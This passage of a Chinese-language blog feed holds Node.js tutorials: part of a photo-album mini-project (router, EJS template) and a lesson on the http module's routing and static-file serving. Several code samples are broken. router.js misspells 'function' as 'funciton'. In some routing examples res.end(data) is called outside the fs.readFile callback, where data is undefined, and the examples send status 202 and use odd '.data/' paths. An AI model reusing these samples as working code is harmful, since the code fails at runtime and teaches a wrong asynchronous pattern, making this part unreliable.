class="string">'Not Found'</span>);</span><br><span class="line">      res.end();</span><br><span class="line">    &#125;</span><br><span class="line">    res.writeHead(<span class="number">200</span>, &#123;</span><br><span class="line">      <span class="string">'Content-Type'</span>: mime.lookup(req.url)</span><br><span class="line">    &#125;)</span><br><span class="line">    res.end(data);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>router.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>);</span><br><span class="line"><span class="keyword">const</span> url = <span class="built_in">require</span>(<span class="string">'url'</span>);</span><br><span class="line"><span class="keyword">const</span> handler = <span class="built_in">require</span>(<span class="string">'./handler'</span>);</span><br><span class="line"><span class="built_in">module</span>.exports = funciton(req, res) &#123;</span><br><span class="line">  <span class="keyword">const</span> urlObj = url.parse(req.url, <span class="literal">true</span>);</span><br><span class="line">  <span class="keyword">const</span> pathname = urlObj.pathname; </span><br><span class="line">  <span class="keyword">const</span> queryObj = urlObj.query;</span><br><span class="line">  <span class="comment">// 一个请求对应了一个处理流程代码</span></span><br><span class="line">  <span class="keyword">if</span> (pathname === <span class="string">'/'</span>) &#123;</span><br><span class="line">    handler.showIndex(req, res);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pathname.startsWith(<span class="string">'/public/'</span>) || pathname.startsWith(<span class="string">'/uploads/'</span>) || pathname.startsWith(<span class="string">'/node_modules/'</span>)) &#123;</span><br><span class="line">    handler.showPublic(req, res);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>./views/index.html</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html lang=<span class="string">"en"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line">  &lt;title&gt;我的相册&lt;<span class="regexp">/title&gt;</span></span><br><span class="line"><span class="regexp">  &lt;meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0"&gt;</span></span><br><span class="line"><span class="regexp">  &lt;link rel="stylesheet" href="node_modules/</span>bootstrap/dist/css/bootstrap.css<span class="string">"&gt;</span></span><br><span class="line"><span class="string">  &lt;link rel="</span>stylesheet<span class="string">" href="</span>public/css/main.css<span class="string">"&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">  &lt;div class="</span>container-fluid<span class="string">"&gt;</span></span><br><span class="line"><span class="string">    &lt;nav class="</span>navbar navbar-<span class="keyword">default</span><span class="string">"&gt;</span></span><br><span class="line"><span class="string">      &lt;div class="</span>container-fluid<span class="string">"&gt;</span></span><br><span class="line"><span class="string">        &lt;div class="</span>navbar-header<span class="string">"&gt;</span></span><br><span class="line">          &lt;button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1" aria-expanded="false"&gt;</span><br><span class="line">            &lt;span <span class="class"><span class="keyword">class</span></span>=<span class="string">"sr-only"</span>&gt;Toggle navigation&lt;<span class="regexp">/span&gt;</span></span><br><span class="line"><span class="regexp">            &lt;span class="icon-bar"&gt;&lt;/</span>span&gt;</span><br><span class="line">            &lt;span <span class="class"><span class="keyword">class</span></span>=<span class="string">"icon-bar"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line">            &lt;span <span class="class"><span class="keyword">class</span></span>=<span class="string">"icon-bar"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line">          &lt;<span class="regexp">/button&gt;</span></span><br><span class="line"><span class="regexp">          &lt;a class="navbar-brand" href="/</span><span class="string">"&gt;我的相册&lt;/a&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;div class="</span>collapse navbar-collapse<span class="string">" id="</span>bs-example-navbar-collapse<span class="number">-1</span><span class="string">"&gt;</span></span><br><span class="line"><span class="string">          &lt;ul class="</span>nav navbar-nav<span class="string">"&gt;</span></span><br><span class="line"><span class="string">            &lt;li class="</span>active<span class="string">"&gt;&lt;a href="</span>/<span class="string">"&gt;首页 &lt;span class="</span>sr-only<span class="string">"&gt;(current)&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="string">          &lt;/ul&gt;</span></span><br><span class="line"><span class="string">          &lt;ul class="</span>nav navbar-nav navbar-right<span class="string">"&gt;</span></span><br><span class="line"><span class="string">            &lt;li&gt;</span></span><br><span class="line">              &lt;a href="" data-toggle="modal" data-target="#exampleModal" data-whatever="@mdo"&gt;新建相册&lt;/a&gt;</span><br><span class="line">            &lt;<span class="regexp">/li&gt;</span></span><br><span class="line"><span class="regexp">          &lt;/u</span>l&gt;</span><br><span class="line">        &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">      &lt;/</span>div&gt;</span><br><span class="line">    &lt;<span class="regexp">/nav&gt;</span></span><br><span class="line"><span class="regexp">  &lt;/</span>div&gt;</span><br><span class="line">  &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"container"</span>&gt;</span><br><span class="line">    &lt;!-- 使用模板引擎 --&gt;</span><br><span class="line">    &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"row"</span>&gt;</span><br><span class="line">      &lt;% albumNames.forEach(<span class="function"><span class="keyword">function</span>(<span class="params">albumName</span>)</span>&#123; %&gt;</span><br><span class="line">        &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"col-xs-6 col-md-3"</span>&gt;</span><br><span class="line">          &lt;a href=<span class="string">"#"</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">"thumbnail"</span>&gt;</span><br><span class="line">            &lt;img src=<span class="string">"public/img/icon.png"</span> alt=<span class="string">""</span>&gt;</span><br><span class="line">          &lt;<span class="regexp">/a&gt;</span></span><br><span class="line"><span class="regexp">          &lt;div class="caption"&gt;</span></span><br><span class="line"><span class="regexp">            &lt;h3&gt;&lt;%= albumName %&gt;&lt;/</span>h3&gt;</span><br><span class="line">          &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">        &lt;/</span>div&gt;</span><br><span class="line">      &lt;% &#125;) %&gt;</span><br><span class="line">    &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">  &lt;/</span>div&gt;</span><br><span class="line">  &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"modal fade"</span> id=<span class="string">"exampleModal"</span> tabindex=<span class="string">"-1"</span> role=<span class="string">"dialog"</span> aria-labelledby=<span class="string">"exampleModalLabel"</span>&gt;</span><br><span class="line">    &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"modal-dialog"</span> role=<span class="string">"document"</span>&gt;</span><br><span class="line">      &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"modal-content"</span>&gt;</span><br><span class="line">        &lt;form action=<span class="string">"/"</span> method=<span class="string">"post"</span>&gt;</span><br><span class="line">          &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"modal-header"</span>&gt;</span><br><span class="line">            &lt;button type=<span class="string">"button"</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">"close"</span> data-dismiss=<span class="string">"modal"</span> aria-label=<span class="string">"Close"</span>&gt;<span class="xml"><span class="tag">&lt;<span class="name">span</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span>&amp;times;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><span class="xml"><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line">            &lt;h4 <span class="class"><span class="keyword">class</span></span>=<span class="string">"modal-title"</span> id=<span class="string">"exampleModalLabel"</span>&gt;新建相册&lt;<span class="regexp">/h4&gt;</span></span><br><span class="line"><span class="regexp">          &lt;/</span>div&gt;</span><br><span class="line">          &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"modal-body"</span>&gt;</span><br><span class="line">            &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"form-group"</span>&gt;</span><br><span class="line">              &lt;label <span class="keyword">for</span>=<span class="string">"recipient-name"</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">"control-label"</span>&gt;相册名称:<span class="xml"><span class="tag">&lt;/<span class="name">label</span>&gt;</span></span></span><br><span class="line">              &lt;input type=<span class="string">"text"</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">"form-control"</span> name=<span class="string">"albumName"</span> placeholder=<span class="string">"请输入相册名称"</span>&gt;</span><br><span class="line">            &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">          &lt;/</span>div&gt;</span><br><span class="line">          &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"modal-footer"</span>&gt;</span><br><span class="line">            &lt;button type=<span class="string">"button"</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">"btn btn-default"</span> data-dismiss=<span class="string">"modal"</span>&gt;关闭&lt;<span class="regexp">/button&gt;</span></span><br><span class="line"><span class="regexp">            &lt;button type="submit" class="btn btn-success"&gt;点击添加&lt;/</span>button&gt;</span><br><span class="line">          &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">        &lt;/</span>form&gt;</span><br><span class="line">      &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">    &lt;/</span>div&gt;</span><br><span class="line">  &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">  &lt;script src="node_modules/</span>jquery/dist/jquery.js<span class="string">"&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">  &lt;script src="</span>node_modules/bootstrap/dist/js/bootstrap.js<span class="string">"&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure><h2 id="请求处理模块调用流程图"><a href="#请求处理模块调用流程图" class="headerlink" title="请求处理模块调用流程图"></a>请求处理模块调用流程图</h2><p><img src="/images/请求处理模块调用流程图.png" alt="请求处理模块调用流程图"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;完成相册新建、上传图片等简单的功能小项目。&lt;/p&gt;
&lt;h2 id=&quot;项目初始化&quot;&gt;&lt;a href=&quot;#项目初始化&quot; class=&quot;headerlink&quot; title=&quot;项目初始化&quot;&gt;&lt;/a&gt;项目初始化&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;把前端用到的静态资源放到 &lt;code&gt;public&lt;/code&gt; 目录下&lt;/li&gt;
&lt;li&gt;把所有的页面都放到 &lt;code&gt;views&lt;/code&gt; 目录下&lt;/li&gt;
&lt;li&gt;在项目根路径下创建一个 &lt;code&gt;app.js&lt;/code&gt; 作为后台的启动入口&lt;/li&gt;
&lt;li&gt;使用 npm 安装和管理项目的依赖项&lt;/li&gt;
&lt;li&gt;将所有的相册放到项目根路径下的 &lt;code&gt;uploads&lt;/code&gt;目录小&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&quot;划分哪些资源公共开放&quot;&gt;&lt;a href=&quot;#划分哪些资源公共开放&quot; class=&quot;headerlink&quot; title=&quot;划分哪些资源公共开放&quot;&gt;&lt;/a&gt;划分哪些资源公共开放&lt;/h2&gt;
    
    </summary>
    
      <category term="Node.js" scheme="http://yoursite.com/categories/Node-js/"/>
    
    
      <category term="Node.js" scheme="http://yoursite.com/tags/Node-js/"/>
    
      <category term="Underscore" scheme="http://yoursite.com/tags/Underscore/"/>
    
      <category term="mine" scheme="http://yoursite.com/tags/mine/"/>
    
      <category term="小项目" scheme="http://yoursite.com/tags/%E5%B0%8F%E9%A1%B9%E7%9B%AE/"/>
    
  </entry>
  
  <entry>
    <title>Node-http-网站</title>
    <link href="http://yoursite.com/2017/01/16/Node-http-%E7%BD%91%E7%AB%99/"/>
    <id>http://yoursite.com/2017/01/16/Node-http-网站/</id>
    <published>2017-01-15T16:00:00.000Z</published>
    <updated>2018-06-06T05:45:36.616Z</updated>
    
    <content type="html"><![CDATA[<p>超文本传输协议（HTTP，HyperText Transfer Protocol)是互联网上应用最为广泛的一种网络协议</p><p>接收请求<br>处理请求<br>发送响应<br>net 为什么不能处理浏览器的响应呢？</p><p>http 模块和 net 模块之间的区别</p><a id="more"></a><h2 id="http-模块的简单使用"><a href="#http-模块的简单使用" class="headerlink" title="http 模块的简单使用"></a>http 模块的简单使用</h2><p>(1). 创建服务器，得到一个 Server 实例对象</p><ul><li>任何请求都会触发该 request 请求事件，然后执行事件处理函数</li><li>也就是说所有的请求入口就是这个 request 事件</li><li>如何区分不同的请求<ul><li>每个请求有请求报文: 请求头、请求路径、请求方法等信息</li></ul></li><li>Node 将每一个请求中的请求报文信息解析为一个对象：Request ，挂载给请求处理函数的第一个参数<ul><li>也就是说可以通过 Request 请求对象拿到一些请求报文信息，例如请求方法、请求路径、请求头部字段等信息</li></ul></li><li>同时，Node 还提供了一个接口对象：Response<ul><li>该对象可以用来给当前请求发送响应数据<br>(2). 监听服务器 Server 对象的 Request 请求事件，设置请求处理函数</li></ul></li></ul><p>(3). 绑定监听端口，启动服务器，设置启动成功之后的回调处理函数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 导入 http 模块</span></span><br><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"><span class="comment">// 创建 http 服务器</span></span><br><span class="line"><span class="keyword">const</span> server = http.createServer(); </span><br><span class="line"><span class="comment">// 监听 request 事件</span></span><br><span class="line">server.on(<span class="string">'request'</span>, (req, res) =&gt; &#123;</span><br><span class="line">  res.end(<span class="string">'hello world'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 开启服务端口</span></span><br><span class="line">server.listen(<span class="number">3000</span>, () =&gt; &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'Server is running at port 3000.'</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="对不同的请求发送不同的响应"><a href="#对不同的请求发送不同的响应" class="headerlink" title="对不同的请求发送不同的响应"></a>对不同的请求发送不同的响应</h2><ul><li>当用户访问 <code>&#39;/&#39;</code> 的时候，返回 index page</li><li>当用户访问 <code>&#39;/add&#39;</code> 的时候，返回 add page</li><li>当用户访问 <code>&#39;/about&#39;</code> 的时候，返回 about page</li><li>当用户访问 <code>&#39;/xxx&#39;</code> 的时候，返回 404</li></ul><p>(1). 获取当前的请求路径（通过 Request 请求对象的 url 属性获取）</p><p><strong>这里的请求路径永远都是以 <code>/</code> 开头的</strong></p><p>例如你在浏览器地址中输入的是:</p><ul><li><code>http://127.0.0.1:3000</code> 则 url 就是 /</li><li><code>http://127.0.0.1:3000/</code> 则 url 就是 /</li><li><code>http://127.0.0.1:3000/add</code> 则 url 就是 /add</li></ul><p>(2). 发送响应</p><p>2.1 请求之后，可以使用 res.write 方法发送响应</p><p>2.2 注意：res.write 可以向响应流中多次发送数据，</p><ul><li>但是一定要在写完响应流数据之后调用 <code>res.end()</code> 方法结束响应。</li><li>否则客户端浏览器还认为你的数据没有发送完毕，一直等待接收。</li></ul><p>2.3 一般发送响应数据的时候，很少有这种需要多次调用 write 方法来发送的数据</p><ul><li>就是说一般就是 <code>res.write(&#39;响应数据&#39;)</code>, <code>res.end()</code> 结束响应</li><li>所以，可以使用 <code>res.end(&#39;响应数据&#39;)</code> 直接发送响应数据，同时结束响应</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"><span class="keyword">const</span> server = http.createServer();</span><br><span class="line">server.on(<span class="string">'request'</span>, (req, res) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> url = req.url;   </span><br><span class="line">  <span class="comment">// res.write(url);  </span></span><br><span class="line">  <span class="comment">// res.end();</span></span><br><span class="line">  res.end(url);</span><br><span class="line">&#125;);</span><br><span class="line">server.listen(<span class="number">3000</span>, () =&gt; &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'Server is running at port 3000...'</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="根据不同请求响应不同内容"><a href="#根据不同请求响应不同内容" class="headerlink" title="根据不同请求响应不同内容"></a>根据不同请求响应不同内容</h2><p>因此，可以这样来判断</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"><span class="keyword">const</span> server = http.createServer();</span><br><span class="line">server.on(<span class="string">'request'</span>, (req, res) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> url = req.url;   </span><br><span class="line">  <span class="keyword">if</span> (url === <span class="string">'/'</span>) &#123;</span><br><span class="line">    res.end(<span class="string">'&lt;h1&gt;index page&lt;/h1&gt;'</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (url === <span class="string">'/add'</span>) &#123;</span><br><span class="line">    res.end(<span class="string">'&lt;h1&gt;add page&lt;/h1&gt;'</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (url === <span class="string">'/about'</span>) &#123;</span><br><span class="line">    res.end(<span class="string">'about page'</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    res.end(<span class="string">'404 Not Found.'</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line">server.listen(<span class="number">3000</span>, () =&gt; &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'Server is running at port 3000...'</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="处理页面中的静态资源"><a href="#处理页面中的静态资源" class="headerlink" title="处理页面中的静态资源"></a>处理页面中的静态资源</h2><p>上面这段代码表示可以解析 html 字符串，那也可以响应页面。</p><p>如果要处理一些读取出来的 html 字符串，那读文件的时候就指定编码或者调用 data.toString() 方法转为字符。</p><ul><li>这里因为不处理字符串，所以就不转字符</li><li><code>res.end()</code> 只能接收 二进制数据或者 字符串，其它都报错</li><li>如果传递的字符串，则发送响应的时候，还会自动将字符串转为二进制再发送</li><li>如果直接就传递的是二进制数据，则直接发送</li></ul><blockquote><p>当客户端浏览器收到发送的响应数据的时：</p></blockquote><ul><li>浏览器会先查看响应报文头中的 <code>Content-Type</code> 中的 <code>charset</code> 编码，然后根据该编码解析数据</li><li>如果响应报文头中没有 <code>Content-Type</code> 那么浏览器则根据 HTML 结构中的 <code>&lt;meta charset=&quot;UTF-8&quot;&gt;</code> 来解析数据</li><li>可以通过 <code>res.writeHead</code> 方法在结束响应之前，写响应头</li><li>查询网址：<a href="http://tool.oschina.net/commons" target="_blank" rel="noopener">http://tool.oschina.net/commons</a></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="keyword">const</span> server = http.createServer();</span><br><span class="line">server.on(<span class="string">'request'</span>, (req, res) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> url = req.url;   </span><br><span class="line">  <span class="keyword">if</span> (url === <span class="string">'/'</span>) &#123;</span><br><span class="line">    fs.readFile(<span class="string">'.data/index.html'</span>, (err, data) =&gt; &#123;</span><br><span class="line">      <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="keyword">throw</span> err;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="comment">// 在结束响应之前，写响应头，指定charset 编码</span></span><br><span class="line">    res.writeHead(<span class="number">202</span>, <span class="string">'OK'</span>, &#123;</span><br><span class="line">      <span class="string">'Content-Type'</span>: <span class="string">'text/html; charset=utf-8'</span></span><br><span class="line">    &#125;);</span><br><span class="line">    res.end(data);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (url === <span class="string">'/add'</span>) &#123;</span><br><span class="line">    fs.readFile(<span class="string">'.data/add.html'</span>, (err, data) =&gt; &#123;</span><br><span class="line">      <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="keyword">throw</span> err;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    res.writeHead(<span class="number">202</span>, <span class="string">'OK'</span>, &#123;</span><br><span class="line">      <span class="string">'Content-Type'</span>: <span class="string">'text/html; charset=utf-8'</span></span><br><span class="line">    &#125;);</span><br><span class="line">    res.end(data);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (url === <span class="string">'/about'</span>) &#123;</span><br><span class="line">    res.writeHead(<span class="number">200</span>, <span class="string">'OK'</span>, &#123;</span><br><span class="line">      <span class="string">'Content-Type'</span>: <span class="string">'text/plain; charset=utf-8'</span></span><br><span class="line">    &#125;)</span><br><span class="line">    res.end(<span class="string">'about page'</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    fs.readFile(<span class="string">'.data/404.html'</span>, (err, data) =&gt; &#123;</span><br><span class="line">      <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="keyword">throw</span> err;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    res.writeHead(<span class="number">404</span>, <span class="string">'Not Found'</span>, &#123;</span><br><span class="line">      <span class="string">'Content-Type'</span>: <span class="string">'text/html; charset=utf-8'</span></span><br><span class="line">    &#125;)</span><br><span class="line">    res.end(data);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line">server.listen(<span class="number">3000</span>, () =&gt; &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'Server is running at port 3000...'</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="处理页面中的动态资源和静态资源"><a href="#处理页面中的动态资源和静态资源" class="headerlink" title="处理页面中的动态资源和静态资源"></a>处理页面中的动态资源和静态资源</h2><p>同一个页面中有多个外链，不是指 a 标签。</p><p>当浏览器获取到当前响应的 HTML 格式字符串之后，浏览器从上到下依次解析字符串（HTML 结构文档）。</p><p>在解析的过程中，如果发现有 link img script iframe 等具有 src 或 href 的标签：a 标签和他们不一样，a 标签是用来跳转的，资源在另一个页面。则，浏览器主动对该资源指向的地址发起请求</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>);</span><br><span class="line">http</span><br><span class="line">  .createServer()</span><br><span class="line">  .on(<span class="string">'request'</span>, (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> url = req.url;</span><br><span class="line">    <span class="keyword">if</span> (url === <span class="string">'/'</span>) &#123;</span><br><span class="line">      fs.readFile(<span class="string">'./data/static/index.html'</span>, (err, data) =&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span> (err) &#123;</span><br><span class="line">          <span class="keyword">throw</span> err;</span><br><span class="line">        &#125;</span><br><span class="line">        res.writeHead(<span class="number">200</span>, &#123;</span><br><span class="line">          <span class="string">'Content-Type'</span>: <span class="string">'text/html; charset=utf-8'</span></span><br><span class="line">        &#125;);</span><br><span class="line">        res.end(data);</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (url === <span class="string">'/css/main.css'</span>) &#123;</span><br><span class="line">      fs.readFile(<span class="string">'./data/static/css/main.css'</span>, (err, data) =&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span> (err) &#123;</span><br><span class="line">          <span class="keyword">throw</span> err;</span><br><span class="line">        &#125;</span><br><span class="line">        res.writeHead(<span class="number">200</span>, &#123;</span><br><span class="line">          <span class="string">'Content-Type'</span>: <span class="string">'text/css; charset=utf-8'</span></span><br><span class="line">        &#125;);</span><br><span class="line">        res.end(data);</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (url === <span 